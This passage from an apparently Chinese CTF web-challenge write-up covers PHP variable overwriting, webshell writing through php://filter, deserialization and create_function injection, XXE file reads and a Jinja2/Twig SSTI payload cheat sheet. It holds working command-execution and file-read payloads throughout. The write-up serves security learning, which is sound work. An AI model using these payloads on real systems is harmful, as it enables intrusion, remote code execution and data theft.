21.26.10"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$$key</span> = <span class="variable">$flag</span></span><br><span class="line"> <span class="variable">$$value</span> = <span class="variable">$flag</span></span><br><span class="line"> <span class="variable">$$key</span> = <span class="variable">$flag</span></span><br><span class="line"> <span class="comment">// 代码执行过程如下：</span></span><br><span class="line"> <span class="comment">// 第一个foreach 循环处理$_POST数组，传值为_GET[flag]=flag，变量覆盖过程为</span></span><br><span class="line"> <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"> <span class="comment">// 此时注意GET数组的值</span></span><br><span class="line"> $ _GET[<span class="string">&quot;flag&quot;</span>]=<span class="number">123</span></span><br><span class="line"> <span class="comment">// 而经过$_POST的变量覆盖</span></span><br><span class="line"> $ _GET =<span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">&quot;flag&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;flag&quot;</span> &#125; </span><br><span class="line"> <span class="comment">// 故而最开始传GET参数时?flag=xxx，可等于任意值。因为会被POST变量覆盖完成后的值覆盖。</span></span><br><span class="line"> <span class="comment">// 第二个foreach 循环处理$_GET数组，变量覆盖过程为</span></span><br><span class="line"> <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line"> <span class="variable">$key</span>=flag;</span><br><span class="line"> <span class="variable">$value</span>=flag;</span><br><span class="line"> <span class="variable">$$key</span>=<span class="variable">$Svalue</span>;</span><br><span class="line"> <span class="variable">$$key</span>=<span class="variable">$flag</span>;</span><br><span class="line"> <span class="variable">$flag</span>=<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>构造payload：get参数<code>?flag</code>,post参数<code>_GET[flag]=flag</code>得到flag</p><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><p>首先看代码，发现是是get传入文件名post传入内容进行写，肯定通过通过php://filter/convert.base64-decode/resource=1.php来写文件，看到了源码中有<code>&lt;?php exit();</code>看起来应该用<code>?&gt;</code>来闭合一下，那么post传入参数为<code>content=?&gt;a&lt;?php system(&#39;cat /flag&#39;); ?&gt;</code>a为占位的，将<code>&lt;?php system(&#39;cat /flag&#39;); ?&gt;</code>转化为base64为<code>PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=</code>拼接后为<code>content=?&gt;aPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=</code>写shell，访问1.php得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.40.06.png" alt="截屏2025-02-26 21.40.06" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.44.08.png" alt="截屏2025-02-26 21.44.08" style="zoom:50%;" /></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct 当一个对象创建时被调用</span><br><span class="line">__destruct 当一个对象销毁时被调用</span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() 使用unserialize时触发</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 使用serialize时触发</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() 对象被销毁时触发</span><br><span class="line"><span class="title function_ invoke__">__call</span>() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="title function_ invoke__">__get</span>() 用于从不可访问的属性读取数据</span><br><span class="line"><span class="title function_ invoke__">__set</span>() 用于将数据写入不可访问的属性</span><br><span class="line"><span class="title function_ invoke__">__isset</span>() 在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line"><span class="title function_ invoke__">__unset</span>() 在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>首先分析一下源码，因该是给pid传入一个执行命令的函数去执行得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.15.20.png" alt="截屏2025-02-26 22.15.20" style="zoom:50%;" /></p><p>构造payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">process</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$pid</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> example;</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> process;</span><br><span class="line">    <span class="variable">$a</span>-&gt;handle=<span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$b</span>-&gt;pid=<span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">得到payload O:<span class="number">7</span>:<span class="string">&quot;example&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;handle&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;process&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pid&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;);&quot;</span>;&#125;&#125;</span><br><span class="line">发现没有flag那么一步一步找flag发现了cat /<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">  <span class="variable">$b</span>-&gt;pid=<span class="string">&#x27;system(&quot;cat /var/www/html/flag.php&quot;);&#x27;</span>;</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure><h3 id="某函数的复仇"><a href="#某函数的复仇" class="headerlink" title="某函数的复仇"></a>某函数的复仇</h3><p>分析源码，根据题目感觉post参数应该是<code>shaw=create_function</code>，get参数应该先闭合create_function后边也需要闭合<code>/*</code>然后执行<code>system(&#39;t\ac /flag&#39;)</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.27.51.png" alt="截屏2025-02-26 22.27.51" style="zoom:50%;" /></p><p>分析完代码，构造payload<code>?root=;&#125;system(&#39;t\ac /flag&#39;);/*</code>post参数<code>shaw=create_function</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.31.40.png" alt="截屏2025-02-26 22.31.40" style="zoom:50%;" /></p><h3 id="BlackMagic"><a href="#BlackMagic" class="headerlink" title="BlackMagic"></a>BlackMagic</h3><p>首先找到源码，分析源码，通过<code>extract()</code> 函数会将 <code>$_REQUEST</code> 中的键值对提取为变量。</p><p>通过trim()函数把strFlag中的strCharList去掉，最后让strTmp==strContent</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.43.13.png" alt="截屏2025-02-26 22.43.13" style="zoom:50%;" /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中的trim函数的用法：【trim()】函数是php中的内置函数，用于删除字符串左右两边的空格或预定义字符，并返回修改后的字符串，函数语法为：【trim($string, $charlist)】。</span><br><span class="line"> </span><br><span class="line">$string：用于指定要从中删除空白和左右预定义字符的字符串；必需参数，不可省略。</span><br><span class="line"> </span><br><span class="line">$charlist：用于指定要从字符串中删除的字符。可选参数，可省略；如果省略了，则将删除以下所有字符：</span><br><span class="line"> </span><br><span class="line">-  ” ” (ASCII 32 (0x20))，普通空格符</span><br><span class="line">- “\t” (ASCII 9 (0x09))，制表符</span><br><span class="line">- “\n” (ASCII 10 (0x0A))，换行符</span><br><span class="line">- “\r” (ASCII 13 (0x0D))，回车符</span><br><span class="line">- “\0” (ASCII 0 (0x00))，空字节符</span><br><span class="line">- “\x0B” (ASCII 11 (0x0B))，垂直制表符</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>分析后发现没有过滤制表符就是<code>\t %09</code></p><p>然后构造payload<code>?strTmp=%09xxxxx...xxxxx%09</code>得到flag</p><h3 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h3><p>首先访问URL有一个phpinfo，根据题目提示应该是一个外部注入的漏洞，告诉了flag的位置</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-27 14.08.27.png" alt="截屏2025-02-27 14.08.27" style="zoom:50%;" /></p><p><strong>XXE全称为XML External Entity Injection即XMl外部实体注入漏洞</strong></p><p>XXE漏洞是基于可扩展标记语言 ( XML) 而产生的漏洞，XML是用于存储和传输数据，而对应的HTML语言是用来显示数据的。XXE漏洞的主要功能可以用来信息探针、任意文件读取等</p><p>XXE语法：xml 必须包含根元素，它是所有其他元素的父元素，比如以下实例中 root 就是根元素：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> //文档开头必须</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD分为内部和外部</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">内部</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> //声明xml版本</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [   //声明此文档是note类型的文档</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  //声明此文档的所有元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  //定义to元素的类型为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  // 定义from元素类型为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span> // 定义heading为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  // 定义body为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;hello world&quot;</span>&gt;</span> // 定义一个内部实体</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">外部</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span> #定义元素为ANY，即可以接受任何元素。</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span> // 定义通用实体</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span> #定义一个外部实体</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="判读是否存在XXE漏洞："><a href="#判读是否存在XXE漏洞：" class="headerlink" title="判读是否存在XXE漏洞："></a>判读是否存在XXE漏洞：</h5><p><strong>最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</strong></p><p>总共有三个文件可以解析就是do m.php,SimpleXMLElement.php,simplexml_load_string.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//dom.php文件源码</span><br><span class="line">&lt;?php</span><br><span class="line">$data = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line"></span><br><span class="line">print_r($dom);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后构造一下payload，读取flagggg.php中的flag，然后base64解码</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flagggg.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-27 14.29.40.png" alt="截屏2025-02-27 14.29.40" style="zoom:25%;" /></p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>php常见的模板：twig，smarty，blade</p><p>可以使用<a href="https://github.com/epinna/tplmap"><code>tplmap</code></a>一把梭。</p><ul><li><p>注入思路：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>随便找一个内置类对象用__c1ass__拿到他所对应的类</span><br><span class="line"><span class="number">2.</span>用__bases__拿到基类(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="number">3.</span>用__subclasses__()拿到子类列表</span><br><span class="line"><span class="number">4.</span>在子类列表中直接寻找可以利用的类getshell</span><br><span class="line"></span><br><span class="line">对象-&gt; 类-&gt; 基本类-&gt; 子类-&gt; __init__方法-&gt; __globals__属性+_bui1tins属性-&gt; </span><br><span class="line"><span class="built_in">eval</span>函数</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">().__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line">request.__class__.__mro__[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><ul><li><p>常用方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__mro__             <span class="comment"># 查看继承关系和调用顺序，返回元组</span></span><br><span class="line">__base__            <span class="comment"># 返回基类</span></span><br><span class="line">__bases__           <span class="comment"># 返回基类元组</span></span><br><span class="line">__subclasses__()    <span class="comment"># 返回子类列表</span></span><br><span class="line">__init__            <span class="comment"># 调用初始化函数，可以用来跳到__globals__</span></span><br><span class="line">__globals__         <span class="comment"># 返回函数所在的全局命名空间所定义的全局变量，返回字典</span></span><br><span class="line">__builtins__        <span class="comment"># 返回内建内建名称空间字典</span></span><br><span class="line">__dic__             <span class="comment"># 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都</span></span><br><span class="line">是放在类的__dict__里</span><br><span class="line">__getattribute__()  <span class="comment"># 实例、类、函数都具有的__getattribute__魔术方法。事实上，</span></span><br><span class="line">在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）都会自动去调用__getattribute__</span><br><span class="line">方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        <span class="comment"># 调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，</span></span><br><span class="line">就是a.__getitem__(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">__builtins__         <span class="comment"># 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名</span></span><br><span class="line">字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。</span><br><span class="line">__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="built_in">__import__</span>           <span class="comment"># 动态加载类和函数，也就是导入模块，经常用于导入os模块，</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line">__str__()            <span class="comment"># 返回描写这个对象的字符串，可以理解成就是打印出来。</span></span><br><span class="line">url_for              <span class="comment"># flask的一个方法，可以用于得到__builtins__，而且</span></span><br><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">get_flashed_messages <span class="comment"># flask的一个方法，可以用于得到__builtins__，而且</span></span><br><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">lipsum               <span class="comment"># flask的一个方法，可以用于得到__builtins__，而且</span></span><br><span class="line">lipsum.__globals__含有os模块：&#123;&lt;!-- --&gt;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.read()&#125;&#125;</span><br><span class="line">&#123;&lt;!-- --&gt;&#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          <span class="comment"># 应用上下文，一个全局变量</span></span><br><span class="line">request              <span class="comment"># 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。</span></span><br><span class="line">此外，同样可以获取<span class="built_in">open</span>函数:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line">.<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1        <span class="comment"># get传参</span></span><br><span class="line">request.values.x1      <span class="comment"># 所有参数</span></span><br><span class="line">request.cookies          <span class="comment"># cookies参数</span></span><br><span class="line">request.headers          <span class="comment"># 请求头参数</span></span><br><span class="line">request.form.x1        <span class="comment"># post传参    (Content-Type:applicaation</span></span><br><span class="line">/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data           <span class="comment"># post传参    (Content-Type:a/b)</span></span><br><span class="line">request.json         <span class="comment"># post传json  (Content-Type: application/json)</span></span><br><span class="line">config                   <span class="comment"># 当前application的所有配置。此外，也可以这样&#123;&lt;!-- --&gt;</span></span><br><span class="line">&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>过滤器：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">float</span>()            <span class="comment"># 将值转换为float类型；</span></span><br><span class="line">lower()            <span class="comment"># 将字符串转换为小写；</span></span><br><span class="line">upper()            <span class="comment"># 将字符串转换为大写；</span></span><br><span class="line">title()            <span class="comment"># 把值中的每个单词的首字母都转成大写；</span></span><br><span class="line">capitalize()        <span class="comment"># 把变量值的首字母转成大写，其余字母转小写；</span></span><br><span class="line">trim()            <span class="comment"># 截取字符串前面和后面的空白字符；</span></span><br><span class="line">wordcount()        <span class="comment"># 计算一个长字符串中单词的个数；</span></span><br><span class="line">reverse()        <span class="comment"># 字符串反转；</span></span><br><span class="line">replace(value,old,new)                        <span class="comment"># 替换将old替换为new的字符串；</span></span><br><span class="line">truncate(value,length=<span class="number">255</span>,killwords=<span class="literal">False</span>)  <span class="comment"># 截取length长度的字符串；</span></span><br><span class="line">striptags()       <span class="comment"># 删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span></span><br><span class="line">escape()或e       <span class="comment"># 转义字符，会将&amp;lt;、&amp;gt;等符号转义成HTML中的符号。显例：</span></span><br><span class="line">content|escape或content|e。</span><br><span class="line">safe()        <span class="comment"># 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。</span></span><br><span class="line">示例： &#123;&lt;!-- --&gt;&#123;<span class="string">&#x27;&amp;lt;em&amp;gt;hello&amp;lt;/em&amp;gt;&#x27;</span>|safe&#125;&#125;；</span><br><span class="line"><span class="built_in">list</span>()        <span class="comment"># 将变量列成列表；</span></span><br><span class="line">string()    <span class="comment"># 将变量转换成字符串；</span></span><br><span class="line">join()        <span class="comment"># 将一个序列中的参数值拼接成字符串。示例看上面payload；</span></span><br><span class="line"><span class="built_in">abs</span>()        <span class="comment"># 返回一个数值的绝对值；</span></span><br><span class="line">first()        <span class="comment"># 返回一个序列的第一个元素；</span></span><br><span class="line">last()        <span class="comment"># 返回一个序列的最后一个元素；</span></span><br><span class="line"><span class="built_in">format</span>(value,arags,*kwargs)    <span class="comment"># 格式化字符串。比如：&#123;&lt;!-- --&gt;&#123;&quot;%s&quot; - &quot;%s&quot;|</span></span><br><span class="line"><span class="built_in">format</span>(<span class="string">&#x27;Hello?&#x27;</span>,<span class="string">&quot;Foo!&quot;</span>) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line">length()    <span class="comment"># 返回一个序列或者字典的长度；</span></span><br><span class="line"><span class="built_in">sum</span>()        <span class="comment"># 返回列表内数值的和；</span></span><br><span class="line">sort()        <span class="comment"># 返回排序后的列表；</span></span><br><span class="line">default(value,default_value,boolean=false)    <span class="comment"># 如果当前变量没有值，则会使用参</span></span><br><span class="line">数中的值来代替。示例：name|default(<span class="string">&#x27;xiaotuo&#x27;</span>)----如果name不存在，则会使用xiaotuo来</span><br><span class="line">替代。boolean=<span class="literal">False</span>默认是在只有这个变量为undefined的时候才会使用default中的值，如果</span><br><span class="line">想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用<span class="keyword">or</span>来替换。</span><br><span class="line">length()    <span class="comment"># 返回字符串的长度，别名是count</span></span><br></pre></td></tr></table></figure></li><li><p>找可用利用的类：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这是个找可利用类的脚本，可供自行发掘利用链，想利用啥，就找啥</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line">class_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            class_name = <span class="built_in">str</span>(i).split(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(class_name, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> class_name:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;未找到含有“%s”的类，请尝试用其他包查找...&#x27;</span> % search)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p>常用poc：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/shell.cfg&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">.write(<span class="string">&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;</span>)&#125;&#125;           <span class="comment"># 返回None证明传递成功</span></span><br><span class="line">&#123;&#123;config.from_pyfile(<span class="string">&#x27;/tmp/shell.cfg&#x27;</span>)&#125;&#125;                     <span class="comment"># 返回True说明成功</span></span><br><span class="line">写shell</span><br><span class="line">&#123;&#123;config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;[shell_cmd_here]&#x27;</span>,shell=<span class="literal">True</span>)&#125;&#125;          <span class="comment"># 执行想要的shell</span></span><br><span class="line">命令</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line">.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>]</span><br><span class="line">.__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>].__base__.__base__.__base</span><br><span class="line">__[<span class="string">&#x27;__subcla&#x27;</span>+<span class="string">&#x27;sses__&#x27;</span>]()[<span class="number">60</span>][<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__&#x27;</span>+<span class="string">&#x27;glo&#x27;</span>+<span class="string">&#x27;bal&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;__bu&#x27;</span>+<span class="string">&#x27;iltins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&#x27;__im&#x27;</span>+<span class="string">&#x27;port__(&quot;os&quot;).po&#x27;</span>+<span class="string">&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;)</span></span><br><span class="line"><span class="string">.re&#x27;</span>+<span class="string">&#x27;ad()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure></li></ul></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line">　　<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">　　<span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line">　　<span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));  <span class="comment">// 将用户输入作为模版变量的值</span></span><br><span class="line">　　<span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p><p>其中，render() 